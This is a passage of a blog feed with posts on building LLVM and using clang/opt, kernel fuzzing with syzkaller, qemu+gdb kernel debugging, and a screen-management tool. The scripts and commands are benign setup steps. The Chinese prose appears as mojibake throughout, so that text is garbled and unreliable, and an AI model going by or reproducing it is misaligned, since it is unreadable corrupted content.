class="hljs-string">&quot;\nninja finish, return value: $?&quot;</span><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nplease: cd <span class="hljs-variable">$SRC_DIR</span>/build &amp;&amp; ninja install&quot;</span><span class="hljs-comment"># sudo ninja install</span></code></pre><p><strong>éƒ¨åˆ†å‚æ•°è¯´æ˜ï¼š</strong></p><ul><li><p><code>-DCMAKE_BUILD_TYPE</code>ï¼šæœ‰Releaseï¼ŒDebugå’ŒRelWithDebInfoä¸‰ç§é€‰é¡¹ï¼Œåˆ†åˆ«å¯¹åº”-O3ï¼Œ-O0å’Œ-O2ä¸‰ç§ä¼˜åŒ–ã€‚</p></li><li><p><code>-DLLVM_ENABLE_UTILS=ON</code>ï¼šå°†utility binarieså¦‚<code>FileCheck</code>å’Œ<code>not</code>ç­‰å®‰è£…åˆ°<code>CMAKE_INSTALL_PREFIX</code></p></li><li><p><code>-DLLVM_ENABLE_DUMP=ON</code>ï¼šå…è®¸éDebugç¼–è¯‘æ¨¡å¼ä¸‹çš„LLDBåŠ¨æ€è°ƒè¯•LLVMæ—¶å¯ä»¥è°ƒç”¨Valueå¯¹è±¡çš„dumpæ–¹æ³•</p></li><li><code>-DLLVM_ENABLE_ASSERTIONS=ON</code>ï¼šå¯ç”¨ASSERTåŠŸèƒ½ï¼Œå½“clang crashæ—¶æ–¹ä¾¿è°ƒè¯•æ’æŸ¥ï¼Œä½†ä¼šå½±å“clangæ€§èƒ½</li><li><code>-DCMAKE_INSTALL_PREFIX=$cwd/$INSTALL_DIR</code>ï¼šå°†llvm-projectå®‰è£…åˆ°æŒ‡å®šç›®å½•ï¼Œå¦åˆ™ä¼šå®‰è£…åˆ°é»˜è®¤çš„<code>/usr/local</code>ä¸­ã€‚æŒ‡å®šæ­¤é€‰é¡¹ä¹‹åéœ€è¦æ‰‹åŠ¨å°†<code>$INSTALL_DIR/bin</code>å’Œ<code>$INSTALL_DIR/include</code>æ·»åŠ åˆ°ç¯å¢ƒå˜é‡<code>PATH</code>ä¸­</li></ul><h3 id="è‡ªåŠ¨åŒ–å¤šç‰ˆæœ¬ç®¡ç†å™¨llvmmrg"><a href="#è‡ªåŠ¨åŒ–å¤šç‰ˆæœ¬ç®¡ç†å™¨llvmmrg" class="headerlink" title="è‡ªåŠ¨åŒ–å¤šç‰ˆæœ¬ç®¡ç†å™¨llvmmrg"></a>è‡ªåŠ¨åŒ–å¤šç‰ˆæœ¬ç®¡ç†å™¨llvmmrg</h3><h2 id="2-å¸¸ç”¨å‘½ä»¤"><a href="#2-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="2 å¸¸ç”¨å‘½ä»¤"></a>2 å¸¸ç”¨å‘½ä»¤</h2><h3 id="clang"><a href="#clang" class="headerlink" title="clang"></a>clang</h3><p><strong>æ–‡ä»¶è½¬æ¢å›¾</strong></p><p><div align=center><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2023/202304042211483.png" style="zoom: 60%;" /></div></p><ul><li><code>-ccc-print-phrases</code>ï¼šæ‰“å°ç¼–è¯‘é˜¶æ®µï¼ŒæŒ‡å®š<code>-save-temps</code>å‚æ•°å³å¯ä¿å­˜ä»¥ä¸‹å„é˜¶æ®µçš„ä¸­é—´æ–‡ä»¶</li></ul><pre><code class="hljs bash">$ clang -ccc-print-phases foo.c            +- 0: input, <span class="hljs-string">&quot;foo.c&quot;</span>, c         +- 1: preprocessor, &#123;0&#125;, cpp-output      +- 2: compiler, &#123;1&#125;, ir   +- 3: backend, &#123;2&#125;, assembler+- 4: assembler, &#123;3&#125;, object5: linker, &#123;4&#125;, image</code></pre><ul><li><code>-E</code>ï¼šæ‰§è¡Œé¢„å¤„ç†é˜¶æ®µï¼Œ<code>clang -E foo.c -o foo.i</code><ul><li>å¤„ç†æ‰€æœ‰<code>#</code>å¼€å¤´çš„é¢„ç¼–è¯‘æŒ‡ä»¤ï¼ŒåŒ…æ‹¬åˆ é™¤å¹¶å±•å¼€<code>#define</code>å¯¹åº”å®å®šä¹‰ï¼Œå¤„ç†<code>#if/#ifdef/#else/#endif</code>ï¼Œæ’å…¥<code>#include/#import</code>åŒ…å«çš„æ–‡ä»¶</li><li>åˆ é™¤æ‰€æœ‰æ³¨é‡Š<code>//</code>å’Œ<code>/**/</code></li><li>æ·»åŠ è¡Œå·å’Œæ–‡ä»¶åæ ‡è¯†ï¼Œå¦‚<code># 1 foo.m</code></li></ul></li><li><code>-S</code>ï¼šè¿›è¡Œç¼–è¯‘ï¼ŒåŒ…æ‹¬ä¸Šè¿°é˜¶æ®µä»¥åŠLLVMç”Ÿæˆå’Œä¼˜åŒ–é˜¶æ®µï¼Œç¼–è¯‘ç”Ÿæˆä¸€ä¸ªæ±‡ç¼–æ–‡ä»¶ï¼Œ<code>clang -S foo.c/foo.i -o foo.s</code><ul><li>è¯æ³•åˆ†æï¼šå°†æºä»£ç çš„å­—ç¬¦åˆ†å‰²æˆtokenï¼ˆå…³é”®å­—ï¼Œæ ‡è¯†ç¬¦ï¼Œå˜é‡ï¼Œç‰¹æ®Šç¬¦å·ç­‰ï¼‰</li><li>è¯­æ³•åˆ†æï¼šç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘AST</li><li>é™æ€åˆ†æï¼šåˆ†æç±»å‹å£°æ˜å’ŒåŒ¹é…é—®é¢˜ç­‰</li><li>ä¸­é—´è¯­è¨€ç”Ÿæˆï¼šæ ¹æ® AST è‡ªé¡¶å‘ä¸‹éå†é€æ­¥ç¿»è¯‘æˆ LLVM IR</li><li>ç›®æ ‡ä»£ç ç”Ÿæˆä¸ä¼˜åŒ–ï¼šæ ¹æ®ä¸­é—´è¯­è¨€ç”Ÿæˆä¾èµ–å…·ä½“æœºå™¨çš„æ±‡ç¼–è¯­è¨€ï¼Œå¹¶ä¼˜åŒ–æ±‡ç¼–è¯­è¨€</li></ul></li><li><code>-c</code>ï¼šè¿è¡Œå‰é¢æ‰€æœ‰çš„é˜¶æ®µå¹¶ç”Ÿæˆç›®æ ‡æ–‡ä»¶ï¼Œ<code>clang -c foo.c -o foo.o</code></li><li><code>-###</code>ï¼šæ‰“å°æ­¤æ¬¡ç¼–è¯‘æ‰€æ‰§è¡Œçš„å‘½ä»¤åŠé€‰é¡¹ï¼Œä½†å®é™…ä¸è¿›è¡Œç¼–è¯‘è¿è¡Œ</li><li><code>-fsyntax-only -Xclang -ast-dump</code>ï¼šæ‰“å°è¯­æ³•æ ‘AST</li><li><code>`-E -Xclang -dump-tokens</code>ï¼šè§£æå¹¶æ‰“å°tokensï¼Œå¯ç”¨ä½œè¯æ³•åˆ†æ</li></ul><h3 id="opt"><a href="#opt" class="headerlink" title="opt"></a>opt</h3><ul><li><p><code>--print-passes</code>ï¼šæ‰“å°å¯ç”¨passes</p></li><li><p><code>-enable-new-pm=0 --dot-cfg foo.ll</code>ï¼šç”Ÿæˆdotæ ¼å¼çš„cfgï¼Œæ˜¯ä»¥å‡½æ•°ä¸ºç²’åº¦ç”Ÿæˆ<code>.*.dot</code>æ–‡ä»¶çš„</p></li><li><code>-enable-new-pm=0 --dot-callgraph foo.ll</code>ï¼šç”Ÿæˆdotæ ¼å¼çš„cg</li></ul><h3 id="dot"><a href="#dot" class="headerlink" title="dot"></a>dot</h3><ul><li><code>dot -Tpng .main.dot -o main.cfg.png</code>ï¼šå°†dotè½¬ä¸ºpng</li></ul><h2 id="3-å¸¸ç”¨åˆ†æPass"><a href="#3-å¸¸ç”¨åˆ†æPass" class="headerlink" title="3 å¸¸ç”¨åˆ†æPass"></a>3 å¸¸ç”¨åˆ†æPass</h2><p>To be completed</p><h2 id="4-åŸºäºLLVMçš„é™æ€åˆ†æå·¥å…·"><a href="#4-åŸºäºLLVMçš„é™æ€åˆ†æå·¥å…·" class="headerlink" title="4 åŸºäºLLVMçš„é™æ€åˆ†æå·¥å…·"></a>4 åŸºäºLLVMçš„é™æ€åˆ†æå·¥å…·</h2><h3 id="crix-ndi-IPPO"><a href="#crix-ndi-IPPO" class="headerlink" title="crix/ndi/IPPO"></a>crix/ndi/IPPO</h3><p>å®ƒä»¬åŸºæœ¬éƒ½æ˜¯ç”±The Systems Security Group at University of Minnesotaï¼ˆ<a href="https://github.com/umnsec">umnsec</a>ï¼‰å¼€å‘çš„é™æ€åˆ†æå·¥å…·ï¼Œç”¨äºæŒ–æ˜ç‰¹å®šçš„å†…æ ¸æ¼æ´ï¼Œä»£ç æ¶æ„å‡ ä¹ä¸€æ ·ï¼š</p><ul><li>Crix: Detecting Missing-Check Bugs in OS Kernels<ul><li>Usenix Security 2019</li><li><a href="https://github.com/umnsec/crix">https://github.com/umnsec/crix</a></li></ul></li><li><p>Detecting Missed Security Operations Through Differential Checking of Object-based Similar Paths</p><ul><li>CCS 2021</li><li><a href="https://github.com/dinghaoliu/IPPO">https://github.com/dinghaoliu/IPPO</a></li></ul></li><li><p>NDI: Non-Distinguishable Inconsistencies as a Deterministic Oracle for Detecting Security Bugs</p><ul><li>CCS 2022</li><li><a href="https://github.com/umnsec/ndi">https://github.com/umnsec/ndi</a></li></ul></li></ul><p>å®‰è£…æ—¶å¯èƒ½é‡åˆ°ä»¥ä¸‹å‘ï¼š</p><ul><li>zlib</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># éœ€è¦ZLIB_ROOT</span><span class="hljs-built_in">export</span> ZLIB_ROOT=<span class="hljs-comment"># å¹¶ä¿®æ”¹CMakeFileList.txt</span></code></pre><h3 id="deadline"><a href="#deadline" class="headerlink" title="deadline"></a>deadline</h3><h2 id="5-å‚è€ƒ"><a href="#5-å‚è€ƒ" class="headerlink" title="5 å‚è€ƒ"></a>5 å‚è€ƒ</h2><p><a href="https://llvm.org/docs/index.html">[1] LLVMå®˜æ–¹æ–‡æ¡£</a>ï¼ˆå…¶ä¸­å€¼å¾—çœ‹çš„å‡ ä¸ªå­é“¾æ¥<a href="https://llvm.org/docs/GettingStarted.html">Getting Started with the LLVM System</a>ï¼Œ<a href="https://llvm.org/docs/tutorial/index.html">LLVM Tutorial: Table of Contents</a>ï¼Œ<a href="https://llvm.org/docs/ProgrammersManual.html">LLVM Programmerâ€™s Manual</a>ï¼Œ<a href="https://llvm.org/docs/WritingAnLLVMPass.html">Writing an LLVM Pass</a>ï¼‰</p><p><a href="https://zhuanlan.zhihu.com/p/594998469">[2] LLVM Analysis Pass å®éªŒï¼ˆä¸€ï¼‰åŸºç¡€æ“ä½œæ±‡æ€»</a></p><p><a href="https://zhuanlan.zhihu.com/p/596465125">[3] LLVM Analysis Pass å®éªŒï¼ˆäºŒï¼‰æ§åˆ¶æµï¼ˆControl Flowï¼‰å¯è§†åŒ–</a></p><p><a href="https://zhqli.com/category/7c7d2b9e8389cc541dc5a615e05bcf1e">[4] zhqliçš„åšå®¢: LLVMæ•™ç¨‹</a></p><p><a href="https://juejin.cn/post/7102477449421652005">[5] æµ…å­¦ Clangï¼ˆä¸€ï¼‰ï¼šclang æŒ‡ä»¤ä»‹ç»</a></p><p><a href="https://buaa-se-compiling.github.io/miniSysY-tutorial/">[6] miniSysY ç¼–è¯‘å®éªŒ | åŒ—èˆªè½¯é™¢</a></p>]]></content>
    
    
    <categories>
      
      <category>Static Analysis</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LLVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å†…æ ¸FuzzæŠ€å·§ä¸å¤‡å¿˜</title>
    <link href="/2023/02/01/%E5%86%85%E6%A0%B8Fuzz%E6%8A%80%E5%B7%A7%E4%B8%8E%E5%A4%87%E5%BF%98/"/>
    <url>/2023/02/01/%E5%86%85%E6%A0%B8Fuzz%E6%8A%80%E5%B7%A7%E4%B8%8E%E5%A4%87%E5%BF%98/</url>
    
    <content type="html"><![CDATA[<p>ç•™ä¸ªå¤‡å¿˜å½•æ–¹ä¾¿æŸ¥çœ‹åškernel fuzzingä¸­é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æŠ€å·§ï¼ˆæŒç»­æ›´æ–°ä¸­ingï¼‰</p><span id="more"></span><h2 id="1-å¸¸ç”¨è„šæœ¬"><a href="#1-å¸¸ç”¨è„šæœ¬" class="headerlink" title="1 å¸¸ç”¨è„šæœ¬"></a>1 å¸¸ç”¨è„šæœ¬</h2><ul><li>ä¸€é”®å®‰è£…syzkaller</li></ul><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">set</span> -e <span class="hljs-built_in">sudo</span> apt update<span class="hljs-built_in">sudo</span> apt install -y debootstrap qemu qemu-kvm<span class="hljs-built_in">sudo</span> apt install -y git make build-essential openssh-server bc<span class="hljs-built_in">sudo</span> apt install -y libssl-dev libelf-dev<span class="hljs-built_in">sudo</span> apt install -y flex bison libc6-dev libc6-dev-i386 linux-libc-dev libgmp3-dev libmpfr-dev libmpc-dev<span class="hljs-built_in">pushd</span> ~wget https://dl.google.com/go/go1.19.6.linux-amd64.tar.gztar -zxvf go1.19.6.linux-amd64.tar.gz<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export GOPATH=~/go&quot;</span> &gt;&gt; ~/.bashrc<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;export PATH=\$GOPATH/bin:\$PATH&quot;</span> &gt;&gt; ~/.bashrc<span class="hljs-built_in">source</span> ~/.bashrcgit <span class="hljs-built_in">clone</span> https://github.com/google/syzkaller.git<span class="hljs-built_in">cd</span> syzkallermake -j<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nDone!&quot;</span></code></pre><ul><li>æŸ¥çœ‹crashsç›®å½•ç»“æœ</li></ul><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span>set -ecrash_dir=$1dumb_mode=$2print_help() &#123;        echo -e &quot;Usage: ./get_result.sh /path/to/crashs_dir&quot;        exit 0&#125;<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">customized</span><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-variable">$1</span>=desc, <span class="hljs-variable">$2</span>=repro</span>dumb_filter() &#123;        if [[ $2 -gt 0 ]]        then                echo 0        else                echo 1        fi&#125;if [[ ! -n &quot;$crash_dir&quot; ]]then        print_helpficnt=0for crash in `ls $crash_dir`do        desc=`cat $crash_dir/$crash/description`        syz_repro=`ls $crash_dir/$crash | grep &quot;repro.prog&quot; | wc -l`        c_repro=`ls $crash_dir/$crash | grep &quot;repro.cprog&quot; | wc -l`        repro=`echo &quot;$syz_repro + $c_repro&quot; | bc`        if [[ $repro -gt 0 ]]        then                cnt=`echo &quot;$cnt+1&quot; | bc`        fi        dumb_ret=$(dumb_filter &quot;$desc&quot; &quot;$repro&quot;)        if [[ $dumb_mode == &quot;dumb&quot; &amp;&amp; $dumb_ret -eq &quot;1&quot; ]]        then                continue        fi        echo -e &quot;\n============= $crash =============&quot;        echo -e &quot;$desc&quot;        echo -e &quot;C Repro: $&#123;c_repro&#125;, Syz Repro: $&#123;syz_repro&#125;&quot;done</code></pre><ul><li>TBD</li></ul><h2 id="2-qemuå†…å¤ç°poc"><a href="#2-qemuå†…å¤ç°poc" class="headerlink" title="2 qemuå†…å¤ç°poc"></a>2 qemuå†…å¤ç°poc</h2><h2 id="3-qemu-gdbè°ƒè¯•å†…æ ¸"><a href="#3-qemu-gdbè°ƒè¯•å†…æ ¸" class="headerlink" title="3 qemu+gdbè°ƒè¯•å†…æ ¸"></a>3 qemu+gdbè°ƒè¯•å†…æ ¸</h2><p><strong>é€šè¿‡qemuå¯åŠ¨å¾…è°ƒè¯•çš„å†…æ ¸ï¼š</strong><code>./debug.sh</code></p><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">debug.sh</span><span class="hljs-meta prompt_"># </span><span class="language-bash">åŸºäºsyzkallerçš„create-image.shï¼Œå¼€å¯nokaslr</span>KERNEL=../linux-6.1.12IMAGE=./stretch.imgqemu-system-x86_64 \  -kernel $KERNEL/arch/x86/boot/bzImage \  -append &quot;console=ttyS0 root=/dev/sda nokaslr slub_debug=P kmemleak=on&quot;\  -hda $IMAGE \  -net user,hostfwd=tcp::16112-:22 -net nic \  -enable-kvm \  -cpu host \  -nographic \  -serial mon:stdio \  -m 1G \  -s \  -S \  -smp 1 \  -pidfile kernel.debug.pid \<span class="hljs-meta prompt_">  2&gt;</span><span class="language-bash">&amp;1 | <span class="hljs-built_in">tee</span> kernel.debug.log</span></code></pre><p>ç›¸å…³å‚æ•°è§£é‡Šï¼š</p><ul><li><code>-s</code>ï¼šç›‘å¬gdb 1234ç«¯å£</li><li><code>-S</code>ï¼šå¯åŠ¨åæŒ‚èµ·ï¼Œç­‰å¾…è¿æ¥ï¼ˆoptionalï¼‰</li><li><code>-nographic</code>ï¼šä¸å¯åŠ¨å›¾å½¢ç•Œé¢ï¼Œä¸<code>console=ttyS0</code>ç»„åˆä½¿ç”¨ï¼Œå°†è°ƒè¯•ä¿¡æ¯è¾“å‡ºåˆ°<code>ttyS0</code></li></ul><p><strong>gdbè¿æ¥è¿›è¡Œè°ƒè¯•</strong>ï¼ˆæˆ‘å®‰è£…çš„æ˜¯gdb 10.2ï¼Œä¸å­˜åœ¨éƒ¨åˆ†åšå®¢ä¸­æåˆ°éœ€è¦ä¿®æ”¹gdbæºç å†ç¼–è¯‘çš„é—®é¢˜ï¼‰ï¼š</p><pre><code class="hljs bash">gdb vmlinux --eval-command=<span class="hljs-string">&quot;target remote tcp::1234&quot;</span></code></pre><p><strong>å¸¸ç”¨å‘½ä»¤</strong>ï¼š</p><ul><li>ä¸‹è½¯ä»¶æ–­ç‚¹ï¼šbï¼Œä¸‹ç¡¬ä»¶æ–­ç‚¹ï¼šhbï¼Œåˆ é™¤ç¬¬Nä¸ªæ–­ç‚¹ï¼šdelete N</li><li>æ‰“å°æºç ï¼šlï¼Œæ‰“å°å†…å­˜ï¼šxï¼ˆ<code>x/nfu addr</code>â€ã€‚å«ä¹‰ä¸ºä»¥<code>f</code>æ ¼å¼æ‰“å°ä»<code>addr</code>å¼€å§‹çš„<code>n</code>ä¸ªé•¿åº¦å•å…ƒä¸º<code>u</code>çš„å†…å­˜å€¼ã€‚å¦‚ x/16xwï¼‰</li><li>æŸ¥çœ‹å †æ ˆï¼šbtï¼Œæ­¥è¿›ï¼šnï¼Œæ­¥å…¥ï¼šsï¼Œç»§ç»­è¿è¡Œï¼šc</li></ul><p><strong>è¯¦ç»†è°ƒè¯•æŠ€å·§è¯·è§<a href="">gdbè°ƒè¯•å†…æ ¸æŠ€å·§æ€»ç»“</a></strong></p><p><strong>Trouble shooting</strong></p><ul><li><code>Cannot insert breakpoint 1. Cannot access memory at address 0xffffffff8610ae1b</code><ul><li>ç”¨ç¡¬ä»¶æ–­ç‚¹<code>hbreak</code>è€Œä¸æ˜¯è½¯ä»¶æ–­ç‚¹<code>break</code></li></ul></li></ul><h2 id="4-Troubleshooting"><a href="#4-Troubleshooting" class="headerlink" title="4 Troubleshooting"></a>4 Troubleshooting</h2><h3 id="å†…æ ¸ç¼–è¯‘"><a href="#å†…æ ¸ç¼–è¯‘" class="headerlink" title="å†…æ ¸ç¼–è¯‘"></a>å†…æ ¸ç¼–è¯‘</h3><ul><li>é‡åˆ°<code>FATAL: modpost: vmlinux.o is truncated.</code></li></ul><pre><code class="hljs bash">  LD      vmlinux.o  OBJCOPY modules.builtin.modinfoobjcopy: warning: vmlinux.o has a corrupt section with a size (3b7bb65e) larger than the file sizeobjcopy: warning: vmlinux.o has a corrupt section with a size (59e797c0) larger than the file sizeobjcopy: warning: vmlinux.o has a corrupt section with a size (20ce7197) larger than the file sizeobjcopy: warning: vmlinux.o has a corrupt section with a size (168af608) larger than the file size  GEN     modules.builtin  GEN     .vmlinux.objs  MODPOST Module.symversFATAL: modpost: vmlinux.o is truncated. sechdrs[i].sh_offset=370247648 &gt; sizeof(*hrd)=64make[2]: *** [scripts/Makefile.modpost:144: Module.symvers] Error 1make[1]: *** [/root/kernels/linux-6.5-rc3/Makefile:1984: modpost] Error 2</code></pre><ul><li>åŸå› å¯èƒ½æ˜¯.configå¼€å¯äº†æŸäº›è¾ƒæ–°çš„æ¨¡å—è€Œç¼–è¯‘å™¨ç‰ˆæœ¬è¿‡ä½ï¼Œå»ºè®®å‡çº§ç¼–è¯‘å™¨ï¼ˆgcc â‰¥ 12ï¼Œclang â‰¥ 15ï¼‰</li></ul>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzz</tag>
      
      <tag>Kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ‰¹é‡çª—å£ç®¡ç†å·¥å…·screenctl</title>
    <link href="/2023/01/26/%E6%89%B9%E9%87%8F%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7screenctl/"/>
    <url>/2023/01/26/%E6%89%B9%E9%87%8F%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7screenctl/</url>
    
    <content type="html"><![CDATA[<p>è‡ªå·±å†™çš„ä¸€ä¸ªæ‰¹é‡ç®¡ç†linux screençš„å·¥å…·screenctlï¼Œæ”¯æŒæ‰¹é‡åˆ›å»ºåˆ é™¤ï¼Œå‘½ä»¤æ‰§è¡Œï¼ŒWeb UIç®¡ç†ç­‰åŠŸèƒ½ã€‚ï¼ˆCollaborators wantedï¼‰</p><span id="more"></span><p>å¥½å§ï¼ŒWeb UI è¿˜æ²¡åšå‡ºæ¥ã€‚ğŸ¤£</p><h2 id="1-å®‰è£…"><a href="#1-å®‰è£…" class="headerlink" title="1 å®‰è£…"></a>1 å®‰è£…</h2><ul><li><p>INFOï¼š</p><ul><li>é¡¹ç›®å¼€æºï¼š<a href="https://github.com/QGrain/screenctl/">https://github.com/QGrain/screenctl/</a></li><li>Pypiä¸»é¡µï¼š<a href="https://pypi.org/project/screenctl/">https://pypi.org/project/screenctl/</a></li></ul></li><li><p>å®‰è£…</p></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># å®‰è£…screen</span><span class="hljs-built_in">sudo</span> apt install screen<span class="hljs-comment"># å®‰è£…screenctl (åˆšä¸Šä¼ pypiä¸ä¹…ï¼Œå¯èƒ½å…¶ä»–æºè¿˜æ²¡æœ‰æ›´æ–°)</span>pip install screenctl -i https://pypi.org/simple</code></pre><ul><li><code>screenctl -h</code> æŸ¥çœ‹å¸®åŠ©</li></ul><pre><code class="hljs bash">usage: screenctl [-h] [-c CONF] [-v] actionscreenctl 0.0.4, Controller <span class="hljs-keyword">for</span> screenpositional arguments:  action                create, delete, <span class="hljs-built_in">stat</span>, serveroptional arguments:  -h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span>  -c CONF, --conf CONF  path to configuration  -v, --verbose         show verbose output</code></pre><h2 id="2-ä½¿ç”¨"><a href="#2-ä½¿ç”¨" class="headerlink" title="2 ä½¿ç”¨"></a>2 ä½¿ç”¨</h2><ul><li>æ‰¹é‡åˆ›å»º</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># æ‰¹é‡åˆ›å»ºscreenå¹¶æŒ‰ç…§æŒ‡å®šé…ç½®æ–‡ä»¶æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼ˆå¸¸ç”¨äºFuzzï¼‰</span>screenctl create -c job.json<span class="hljs-comment"># job.jsonç¤ºä¾‹å¦‚ä¸‹: </span>&#123;    <span class="hljs-string">&quot;screen_name1&quot;</span>: <span class="hljs-string">&quot;echo \&quot;name1\&quot; &gt;&gt; name1.log&quot;</span>,    <span class="hljs-string">&quot;screen_name2&quot;</span>: <span class="hljs-string">&quot;timeout 12h /PATH/TO/afl-fuzz -i in -o out PROGRAM ARGS @@&quot;</span>,    <span class="hljs-string">&quot;screen_name3&quot;</span>: <span class="hljs-string">&quot;ping -c 100 baidu.com&quot;</span>&#125;<span class="hljs-comment"># æ‰¹é‡æŸ¥çœ‹screençŠ¶æ€</span>screenctl <span class="hljs-built_in">stat</span> -c job.json</code></pre><ul><li>æ‰¹é‡åˆ é™¤</li></ul><pre><code class="hljs bash"><span class="hljs-comment"># æ‰¹é‡åˆ é™¤job.jsonä¸­çš„æ‰€æœ‰çª—å£</span>screenctl delete -c job.json<span class="hljs-comment"># TODO: æ”¯æŒè‡ªå®šä¹‰åˆ é™¤</span></code></pre><ul><li><strong>Web UI (TODO)ï¼ŒæŠ½æ—¶é—´å†™ ğŸ•ŠğŸ•ŠğŸ•Š</strong></li></ul><pre><code class="hljs bash"><span class="hljs-comment"># TODO: å¯åŠ¨Web UIæ¥æ‰¹é‡ç®¡ç†screenï¼Œç•Œé¢ç±»ä¼¼äºsupervisor</span><span class="hljs-comment"># æ”¯æŒUIç•Œé¢æ‰¹é‡/å•ç‹¬æ“ä½œscreençš„å¯åŠ¨ä¸åˆ é™¤ï¼Œä»¥åŠå…¶ä¸­çš„æ‰§è¡Œå‘½ä»¤å’Œè¾“å‡ºå›æ˜¾</span>screenctl server -c job.json<span class="hljs-comment"># ğŸ•Šå’•å­å’•å­</span></code></pre><h2 id="3-å®ç°åŸç†"><a href="#3-å®ç°åŸç†" class="headerlink" title="3 å®ç°åŸç†"></a>3 å®ç°åŸç†</h2><h3 id="æ‰¹é‡ç®¡ç†æ¨¡å—"><a href="#æ‰¹é‡ç®¡ç†æ¨¡å—" class="headerlink" title="æ‰¹é‡ç®¡ç†æ¨¡å—"></a>æ‰¹é‡ç®¡ç†æ¨¡å—</h3><p>è°ƒç”¨<code>screen</code>ç½¢äº†hhh</p><pre><code class="hljs bash"><span class="hljs-comment"># åˆ›å»ºscreen</span>screen -dm NAME<span class="hljs-comment"># åœ¨screenä¸­æ‰§è¡Œå‘½ä»¤</span>screen -x -S NAME -X stuff CMD<span class="hljs-comment"># åˆ é™¤screen</span>screen -r NAME -X quit</code></pre><p>To be completed</p>]]></content>
    
    
    <categories>
      
      <category>Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DevOps</tag>
      
      <tag>Tricks</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>syzkallerå®‰è£…ä¸ä½¿ç”¨</title>
    <link href="/2022/10/31/syzkaller%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/31/syzkaller%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡è®°å½•äº†æˆ‘çš„syzkallerå®‰è£…å’Œä½¿ç”¨çš„<strong>è¸©å‘è®°å½•</strong>ã€‚</p><p>syzkalleræ˜¯2015å¹´Googleæå‡ºçš„ä¸€æ¬¾ä¸»è¦ç”¨Goç¼–å†™çš„åŸºäºè¦†ç›–ç‡çš„å†…æ ¸fuzzerã€‚<span id="more"></span>2017å¹´å®ƒçš„æŒç»­æ€§fuzzingå¹³å°syzbotéƒ¨ç½²ä¸Šçº¿ï¼Œè¿„ä»Šä¸ºæ­¢å·²ç»æŒ–æ˜å¹¶æŠ¥å‘Šäº†è¶…è¿‡4000ä¸ªå†…æ ¸æ¼æ´ã€‚</p><blockquote><p>å¼ºçƒˆä¸å»ºè®®åœ¨è™šæ‹Ÿæœºä¸­å®‰è£…syzkallerå¹¶è¿›è¡Œå†…æ ¸fuzzï¼Œæœ‰æ¡ä»¶å°½é‡åœ¨é…ç½®è¾ƒå¥½çš„æœåŠ¡å™¨ä¸Šè¿›è¡Œï¼ˆäº²æµ‹orz</p></blockquote><p>é…ç½®ä»£ç†çš„ä¸€ä¸ªå¤§å‘ï¼Œä¿è¯http_proxyç­‰ä»£ç†å¯¹sudoç”Ÿæ•ˆï¼ˆä¸è®ºå½“å‰ç”¨æˆ·æ˜¯å¦ä¸ºrootï¼Œéƒ½éœ€è¦åŠ ä»¥ä¸‹å†…å®¹ï¼‰</p><pre><code class="hljs bash"><span class="hljs-comment">#/etc/sudoers</span>Defaults env_keep += <span class="hljs-string">&quot;http_proxy https_proxy ftp_proxy&quot;</span></code></pre><h2 id="1-å®‰è£…ä¾èµ–"><a href="#1-å®‰è£…ä¾èµ–" class="headerlink" title="1 å®‰è£…ä¾èµ–"></a>1 å®‰è£…ä¾èµ–</h2><ul><li>å®‰è£…åŸºæœ¬è½¯ä»¶ä¾èµ–</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<span class="hljs-built_in">sudo</span> apt install -y debootstrap qemu qemu-kvm<span class="hljs-built_in">sudo</span> apt install -y git make build-essential openssh-server<span class="hljs-built_in">sudo</span> apt install -y libssl-dev libelf-dev<span class="hljs-built_in">sudo</span> apt install -y flex bison libc6-dev libc6-dev-i386 linux-libc-dev libgmp3-dev libmpfr-dev libmpc-dev<span class="hljs-built_in">sudo</span> apt install -y bc <span class="hljs-comment"># åœ¨ä¸€æ¬¡çº¯å‡€dockeræµ‹è¯•ä¸­å‘ç°ç¼–è¯‘å†…æ ¸æ—¶ç¼ºå°‘è¿™ä¸ªåŒ…</span></code></pre><ul><li>å®‰è£…Goï¼ˆå»ºè®®1.19ï¼‰</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~wget https://go.dev/dl/go1.19.7.linux-amd64.tar.gztar -zxvf go1.19.7.linux-amd64.tar.gz <span class="hljs-built_in">export</span> GOPATH=~/go<span class="hljs-built_in">export</span> GOROOT=~/go<span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$GOPATH</span>/bin:<span class="hljs-variable">$PATH</span><span class="hljs-comment"># 